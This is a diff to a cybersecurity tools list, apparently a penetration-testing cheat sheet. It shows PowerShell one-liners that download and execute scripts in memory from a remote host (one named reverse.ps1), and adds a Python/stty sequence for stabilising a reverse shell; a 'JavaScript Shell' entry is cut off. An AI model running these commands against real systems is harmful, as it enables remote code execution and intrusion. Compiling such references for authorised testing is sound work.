@@ -41,6 +41,12 @@ List of tools/resources for Cybersecurity
   - ```iex (iwr 'http://192.168.2.2/file.ps1')``` -> Download in-memory
   - ```iex (New-Object Net.WebClient).DownloadString('https://192.168.2.2/reverse.ps1')``` -> Download in-memory
   - ```$down = [System.NET.WebRequest]::Create("http://192.168.2.2/file.ps1"); $read = $down.GetResponse(); IEX ([System.lO.StreamReader]($read.GetResponseStream())).ReadToEnd()``` -> Download in-memory
+  - ``` 
+    Stabilize Shell
+    python -c 'import pty;pty.spawn("/bin/bash")'
+    export TERM=xterm #Ctrl+Z
+    stty raw -echo; fg
+    ```
   - JavaScript Shell
     ```
     (function(){
